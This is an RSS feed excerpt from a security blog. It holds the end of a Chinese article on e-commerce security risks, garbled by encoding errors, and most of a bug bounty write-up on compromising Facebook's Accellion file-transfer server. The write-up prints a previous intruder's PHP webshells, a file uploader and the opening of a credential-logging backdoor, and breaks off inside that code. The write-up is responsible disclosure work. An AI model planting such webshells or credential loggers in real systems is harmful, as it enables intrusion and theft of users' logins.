&lt;p&gt;ä¸å°‘ä¼æ¥­æ²’æœ‰è‡ªå·±é–‹ç™¼ç¶²ç«™ï¼Œè€Œæ˜¯ç™¼åŒ…çµ¦å¤–éƒ¨å» å•†é–‹ç™¼ã€ç¶­é‹ã€‚æ‰¿åŒ…å•†çš„å“è³ªé€šå¸¸é›£ä»¥æŒæ§ï¼Œåƒ¹æ ¼æˆ°çš„æ¥­ç•Œç”Ÿæ…‹ï¼Œæ›´è®“é–‹ç™¼çš„å“è³ªé›£ä»¥æå‡ã€‚ä½†æ¥­è€…æœ€é ­å¤§çš„æ˜¯ï¼šæ‰¿åŒ…å•†æ‹’çµ•è™•ç†æ¼æ´ã€‚è‹¥æ²’æœ‰åœ¨ä¸€é–‹å§‹çš„å§”å¤–åˆç´„å°±æ˜è¨‚è³‡å®‰ç¶­è­·æ¨™æº–ï¼Œåœ¨æ—¥å¾Œç™¼ç”Ÿè³‡å®‰äº‹ä»¶æ™‚å‰‡é›£ä»¥è¦æ±‚æ‰¿åŒ…å•†ä¿®è£œæ¼æ´ã€‚å› æ­¤å»ºè­°æ¥­è€…åœ¨æ—¥å¾Œçš„å§”å¤–é–‹ç™¼æ¡ˆï¼Œæ˜è¨‚è³‡å®‰æ¨™æº–ã€é©—æ”¶æ™‚æª¢é™„ç¬¬ä¸‰æ–¹æ»²é€æ¸¬è©¦å ±å‘Šï¼Œä¸¦ä¸”å°‡æ—¥å¾Œè³‡å®‰ç¶­è­·åˆç´„ç¨ç«‹æ–¼ä¸€èˆ¬ç¶­è­·ç´„ä¹‹å¤–ï¼Œå¼·åˆ¶åŸ·è¡Œã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šé¸å•†æ¨™æº–ã€é–‹æ¨™è¦æ ¼ã€é©—æ”¶æ¨™æº–ã€è³‡å®‰ç¶­è­·åˆç´„&lt;/p&gt;

&lt;h4 id=&quot;å…§éƒ¨å“¡å·¥é›»è…¦é­å…¥ä¾µå¤–æ´©å€‹è³‡&quot;&gt;å…§éƒ¨å“¡å·¥é›»è…¦é­å…¥ä¾µå¤–æ´©å€‹è³‡&lt;/h4&gt;

&lt;p&gt;é™¤äº†ä¼ºæœå™¨ä¹‹å¤–ï¼Œå®¢æˆ¶ç«¯ä¹Ÿæ˜¯æ”»æ“Šè€…ä¸‹æ‰‹çš„ç›®æ¨™ã€‚ç•¶ç¶²ç«™é›£ä»¥è¢«å…¥ä¾µï¼Œæ”»æ“Šè€…å°±æœƒè½‰å¾€å“¡å·¥é›»è…¦ä¸‹æ‰‹ã€‚é€éç¤¾äº¤å·¥ç¨‹ã€æ­é…æƒ¡æ„éƒµä»¶ç­‰ APT æ”»æ“Šï¼Œå…¥ä¾µå€‹äººé›»è…¦å¾Œå–å¾—æ¶ˆè²»è€…å€‹è³‡ï¼Œç”šè‡³åšç‚ºè·³æ¿æ»²é€ä¼æ¥­å…§éƒ¨æ“´å¤§æ”»æ“Šæˆæœã€‚è‹¥æ²’æœ‰è¶³å¤ çš„è³‡å®‰æ„è­˜ï¼Œå“¡å·¥å°‡æœƒæ˜¯ä¼æ¥­æœ€å¤§çš„è³‡å®‰ç¼ºå£ã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šå¼·åŒ–è³‡å®‰æ€ç¶­ã€æ¬Šé™æœ€å°åŒ–ã€APT é˜²ç¦¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;é…åˆå» å•†å€‹è³‡å¤–æ´©å¦‚é‡‘æµå•†ç‰©æµå•†&quot;&gt;é…åˆå» å•†å€‹è³‡å¤–æ´©ï¼Œå¦‚é‡‘æµå•†ã€ç‰©æµå•†&lt;/h4&gt;

&lt;p&gt;ç•¶ä¼æ¥­è£¡è£¡å¤–å¤–éƒ½é˜²ç¦¦å¥½äº†ï¼Œå€‹è³‡é‚„åœ¨å¤–æ´©ï¼Œåˆ°åº•ç™¼ç”Ÿä»€éº¼äº‹æƒ…äº†å‘¢ï¼Ÿåˆ¥å¿˜äº†ä¸€å€‹é›»å•†ç¶²ç«™æœ‰å„ç¨®èˆ‡å¤–ç•Œæ©‹æ¥çš„æœå‹™ï¼Œä¾‹å¦‚äº¤æ˜“çš„é‡‘æµã€é‹è¼¸çš„ç‰©æµã€‚è‹¥æ­é…çš„å¤–éƒ¨ç³»çµ±é­åˆ°å…¥ä¾µï¼Œå€‹è³‡ä¸€æ¨£æœƒè¢«å–å¾—ã€‚ä½†æ°‘çœ¾ã€åª’é«”åªæœƒè¦ºå¾—ã€Œæˆ‘åœ¨é€™å®¶é›»å•†å¹³å°è²·æ±è¥¿è¢«è©é¨™ã€ï¼Œè€Œæ€ªç½ªåˆ°ä¼æ¥­æœ¬èº«ã€‚ä¼æ¥­æœ‰è²¬ä»»è¦æ±‚é…åˆçš„å» å•†ä¸€åŒå°‡è³‡å®‰ã€å€‹è³‡æŠŠé—œå¥½ã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šé…åˆå» å•†çš„è³‡å®‰è¦ç¯„ã€æ»²é€æ¸¬è©¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;æ”»æ“Šè€…ç”¨å·²å¤–æ´©å¸³è™Ÿå¯†ç¢¼ç™»å…¥é›»å•†ç¶²ç«™&quot;&gt;æ”»æ“Šè€…ç”¨å·²å¤–æ´©å¸³è™Ÿå¯†ç¢¼ç™»å…¥é›»å•†ç¶²ç«™&lt;/h4&gt;

&lt;p&gt;è³‡å®‰çš„è²¬ä»»ä¸¦ä¸åƒ…åœ¨ä¼æ¥­ï¼Œæœ‰çš„æ™‚å€™æ¶ˆè²»è€…æœ¬èº«å¸³è™Ÿçš„å®‰å…¨ä¹Ÿæœƒå½±éŸ¿åˆ°é›»å•†ç¶²ç«™çš„æ¸…è­½ã€‚ç›®å‰æ°‘çœ¾åªè¦æ¥æ”¶åˆ°è©é¨™é›»è©±ï¼Œç›´è¦ºéƒ½æœƒæ˜¯åœ¨æŸå€‹åº—å®¶çš„äº¤æ˜“è¢«é§­ï¼Œè¢«å–å¾—è³‡æ–™å¾Œè²©å”®çµ¦è©é¨™é›†åœ˜ï¼Œå› è€Œå›å ±çµ¦ 165 ç­‰åè©é¨™å°ˆç·šã€‚é€™ç¨®æ¡ˆä¾‹ä¹Ÿæœƒç®—åœ¨é›»å•†ç¶²ç«™çš„å¸³ä¸Šï¼Œä½†å»ä¸ä¸€å®šæ˜¯é›»å•†ç¶²ç«™çš„å•é¡Œã€‚é€™æ¨£çš„æ”»æ“Šæ‰‹æ³•ä¹Ÿä¿—ç¨±ã€Œæ’åº«ã€ã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šä¼æ¥­é–“çš„è¯é˜²ã€æä¾›ä½¿ç”¨è€…å¸³è™Ÿä¿è­·&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;è²·å®¶åœ¨è©é¨™é›†åœ˜çš„è³£å ´äº¤æ˜“&quot;&gt;è²·å®¶åœ¨è©é¨™é›†åœ˜çš„è³£å ´äº¤æ˜“&lt;/h4&gt;

&lt;p&gt;åªè¦æœ‰åˆ©å¯åœ–ï¼Œè©é¨™é›†åœ˜å°±æœƒç„¡æ‰€ä¸ç”¨å…¶æ¥µçš„æƒ³ç²å–åˆ©ç›Šã€‚ç•¶ç³»çµ±å·²ç¶“é”æˆåŸºæœ¬çš„å®‰å…¨ã€ä½¿ç”¨è€…å¤–æ´©çš„å¸³è™Ÿä¹Ÿå·²ç¶“ç„¡æ³•åˆ©ç”¨ä¹‹å¾Œï¼Œè©é¨™é›†åœ˜å°‡å†æ”»æ“Šäººæ€§çš„æ¼æ´ï¼Œé–‹è¨­è²©è³£ç†±é–€å•†å“çš„è³£å ´ï¼Œå¸å¼•ç„¡è¾œçš„å—å®³è€…è³¼è²·ã€‚æˆ–è€…åœ¨è³£å ´çš„ç•™è¨€å€å¡Šå‡å†’è³£å®¶ï¼Œç•™ä¸‹è‡ªå·±çš„ LINE èˆ‡æ¶ˆè²»è€…æºé€šï¼Œé€²è¡Œè©é¨™ã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šæ¶ˆè²»è€…å®‰å…¨å®£å°&lt;/p&gt;

&lt;h3 id=&quot;é›»å•†æ¥­è€…è©²å¦‚ä½•è‡ªä¿&quot;&gt;é›»å•†æ¥­è€…è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;åªè¦æœ‰åˆ©ç›Šçš„åœ°æ–¹ï¼Œå°±æœƒæœ‰è³‡å®‰å±æ©Ÿã€‚é›–èªªé“é«˜ä¸€å°ºé­”é«˜ä¸€ä¸ˆï¼Œä½†æ¥­è€…ä¸¦éåªèƒ½ç­‰è‘—è¢«å®°ã€‚ç¶“ç‡Ÿç¶²ç«™æœ€é‡è¦çš„å°±æ˜¯ä¿è­·é¡§å®¢çš„è³‡æ–™ï¼Œæ˜ç™½é¢¨éšªçš„æ‰€åœ¨ã€‚ç›¤é»æ‰‹ä¸Šçš„å€‹è³‡ä½ç½®ã€æ©Ÿåˆ¶ã€æªæ–½ï¼Œè¬¹æ…å®‰æ’è³‡å®‰è¦åŠƒï¼Œç¢ºä¿å°‡å®‰å…¨çš„é¢¨éšªé™åˆ°æœ€ä½ã€‚æ›´é€²ä¸€æ­¥ä¹Ÿå¯ä»¥å»ºç«‹èˆ‡è³‡å®‰äººå“¡è‰¯å¥½çš„é—œä¿‚ï¼Œå…¬é–‹æ¼æ´é€šå ±ç®¡é“åŠçå‹µæ©Ÿåˆ¶ï¼Œé¼“å‹µè³‡å®‰äººå“¡å„ªå…ˆé€šå ±æ¼æ´çµ¦ä¼æ¥­ï¼Œé¿å…æµå…¥é»‘è‰²ç”¢æ¥­ã€‚ç•¶ç„¶ï¼Œèº«ç‚ºæ¶ˆè²»è€…çš„æˆ‘å€‘ï¼Œä¹Ÿæ‡‰è©²çµ¦äºˆè² è²¬çš„ä¼æ¥­æŒè²ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨æœªä¾†æˆ‘å€‘çš„æ–‡ç« å°‡æåˆ°ä¼æ¥­æ‡‰è©²æ¡å–çš„å…·é«”ä½œç‚ºï¼Œæ•¬è«‹æœŸå¾…ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce/</link>
                <guid>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce</guid>
                <pubDate>Fri, 29 Jul 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>How I Hacked Facebook, and Found Someone's Backdoor Script</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someoneâ€™s Backdoor Script&lt;/a&gt; (English Version)  &lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;æ»²é€ Facebook çš„æ€è·¯èˆ‡ç™¼ç¾&lt;/a&gt; (ä¸­æ–‡ç‰ˆæœ¬)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;foreword&quot;&gt;Foreword&lt;/h3&gt;

&lt;p&gt;As a pentester, I love server-side vulnerabilities more than client-side ones. Why? Because itâ€™s way much cooler to take over the server directly and gain system SHELL privileges. &amp;lt;(ï¿£ï¸¶ï¿£)&amp;gt;&lt;/p&gt;

&lt;p&gt;Of course, both vulnerabilities from the server-side and the client-side are indispensable in a perfect penetration test. Sometimes, in order to take over the server more elegantly, it also need some client-side vulnerabilities to do the trick. But speaking of finding vulnerabilities, I prefer to find server-side vulnerabilities first.&lt;/p&gt;

&lt;p&gt;With the growing popularity of Facebook around the world, Iâ€™ve always been interested in testing the security of Facebook. Luckily, in 2012, Facebook launched the &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty Program&lt;/a&gt;, which even motivated me to give it a shot.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;From a pentesterâ€™s view, I tend to start from recon and do some research. First, Iâ€™ll determine how large is the â€œterritoryâ€ of the company on the internet, thenâ€¦try to find a nice entrance to get in, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What can I find by Google Hacking?&lt;/li&gt;
  &lt;li&gt;How many B Class IP addresses are used? How many C Class IPs?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;What domain names are used? What are their internal domain names? Then proceed with enumerating sub-domains&lt;/li&gt;
  &lt;li&gt;What are their preferred techniques and equipment vendors?&lt;/li&gt;
  &lt;li&gt;Any data breach on Github or Pastebin?&lt;/li&gt;
  &lt;li&gt;â€¦etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Of course, Bug Bounty is nothing about firing random attacks without restrictions. By comparing your findings with the permitted actions set forth by Bug Bounty, the overlapping part will be the part worth trying.&lt;/p&gt;

&lt;p&gt;Here Iâ€™d like to explain some common security problems found in large corporations during pentesting by giving an example.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;For most enterprises, â€œ&lt;strong&gt;Network Boundary&lt;/strong&gt;â€ is a rather difficult part to take care of. When the scale of a company has grown large, there are tens of thousands of routers, servers, computers for the MIS to handle, itâ€™s impossible to build up a perfect mechanism of protection. Security attacks can only be defended with general rules, but a successful attack only needs a tiny weak spot. Thatâ€™s why luck is often on the attackerâ€™s side: a vulnerable server on the â€œborderâ€ is enough to grant a ticket to the internal network!&lt;/li&gt;
  &lt;li&gt;Lack of awareness in â€œ&lt;strong&gt;Networking Equipment&lt;/strong&gt;â€ protection. Most networking equipment doesnâ€™t offer delicate SHELL controls and can only be configured on the user interface. Oftentimes the protection of these devices is built on the Network Layer. However, users might not even notice if these devices were compromised by 0-Day or 1-Day attacks.&lt;/li&gt;
  &lt;li&gt;Security of people: now we have witnessed the emergence of the â€œ&lt;strong&gt;Breached Database&lt;/strong&gt;â€ (aka â€œ&lt;strong&gt;Social Engineering Database&lt;/strong&gt;â€ in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN accessâ€¦then voilÃ ! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Manâ€™s password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P  &lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For sure, when looking for the vulnerabilities on Facebook, I followed the thinking of the penetration tests which I was used to. When I was doing some recon and research, not only did I look up the domain names of Facebook itself, but also tried Reverse Whois. And to my surprise, I found an INTERESTING domain name:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW seemed to stand for â€œ&lt;strong&gt;TheFacebook Network&lt;/strong&gt;â€  &lt;br /&gt;
Then I found bellow server through public data&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;WOW. When I accessed vpn.tfbnw.net thereâ€™s the Juniper SSL VPN login interface. But its version seemed to be quite new and there was no vulnerability can be directly exploitedâ€¦nevertheless, it brought up the beginning of the following story.&lt;/p&gt;

&lt;p&gt;It looked like TFBNW was an internal domain name for Facebook. Letâ€™s try to enumerate the C Class IPs of vpn.tfbnw.net and found some interesting servers, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the info of these servers, I thought that these C Class IPs were relatively important for Facebook. Now, the whole story officially starts here.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;vulnerability-discovery&quot;&gt;Vulnerability Discovery&lt;/h3&gt;

&lt;p&gt;I found a special server among these C Class IPs.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ Login Interface of files.fb.com&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Judging from the LOGO and Footer, this seems to be Accellionâ€™s Secure File Transfer (hereafter known as FTA)&lt;/p&gt;

&lt;p&gt;FTA is a product which enables secure file transfer, online file sharing and syncing, as well as integration with Single Sign-on mechanisms including AD, LDAP and Kerberos. The Enterprise version even supports SSL VPN service.&lt;/p&gt;

&lt;p&gt;Upon seeing this, the first thing I did was searching for publicized exploits on the internet. The latest one was found by HD Moore and made public on this Rapid7â€™s Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Whether this vulnerability is exploitable can be determined by the version information leaked from â€œ&lt;strong&gt;/tws/getStatus&lt;/strong&gt;â€. At the time I discovered files.fb.com the defective v0.18 has already been updated to v0.20. But from the fragments of source code mentioned in the Advisory, I felt that with such coding style there should still be security issues remained in FTA if I kept looking. Therefore, I began to look for 0-Day vulnerabilities on FTA products!&lt;/p&gt;

&lt;p&gt;Actually, from black-box testing, I didnâ€™t find any possible vulnerabilities, and I had to try white-box testing. After gathering the source codes of previous versions FTA from several resources I could finally proceed with my research!&lt;/p&gt;

&lt;p&gt;The FTA Product&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Web-based user interfaces were mainly composed of Perl &amp;amp; PHP&lt;/li&gt;
  &lt;li&gt;The PHP source codes were encrypted by IonCube&lt;/li&gt;
  &lt;li&gt;Lots of Perl Daemons in the background&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;First I tried to decrypt IonCube encryption. In order to avoid being reviewed by the hackers, a lot of network equipment vendors will encrypt their product source codes. Fortunately, the IonCube version used by FTA was not up to date and could be decrypted with ready-made tools. But I still  had to fix some details, or itâ€™s gonna be messyâ€¦&lt;/p&gt;

&lt;p&gt;After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T  &lt;br /&gt;
And the vulnerabilities which needed to be triggered were not easy to exploit. Therefore I need to look deeper!&lt;/p&gt;

&lt;p&gt;Finally, I found 7 vulnerabilities, including&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Apart from reporting to Facebook Security Team, other vulnerabilities were submitted to Accellion Support Team in Advisory for their reference. After vendor patched, I also sent these to CERT/CC and they assigned 4 CVEs for these vulnerabilities.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;More details will be published after full disclosure policy!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ Using Pre-Auth SQL Injection to Write Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
After taking control of the server successfully, the first thing is to check whether the server environment is friendly to you. To stay on the server longer, you have to be familiar with the environments, restrictions, logs, etc and try hard not to be detected. :P&lt;/p&gt;

&lt;p&gt;There are some restrictions on the server:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Firewall outbound connection unavailable, including TCP, UDP, port 53, 80 and 443&lt;/li&gt;
  &lt;li&gt;Remote Syslog server&lt;/li&gt;
  &lt;li&gt;Auditd logs enabled&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Although the outbound connection was not available, but it looked like ICMP Tunnel was working. Nevertheless, this was only a Bug Bounty Program, we could simply control the server with a webshell.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;was-there-something-strange&quot;&gt;Was There Something Strange?&lt;/h3&gt;

&lt;p&gt;While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.&lt;/p&gt;

&lt;p&gt;First of all I found some strange PHP error messages in â€œ&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;â€  &lt;br /&gt;
These error messages seemed to be caused by modifying codes online?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
I followed the PHP paths in error messages and ended up with discovering suspicious WEBSHELL files left by previous â€œvisitorsâ€.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;some contents of the files are as follows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Right, THAT &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;f][&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;], basename(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$_FILES[&amp;quot;f&amp;quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;])); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/remote.inc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;sclient_user_class_standard.inc.orig&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/B3dKe9sQaa0L.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Y-m-d H:i:s T&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span 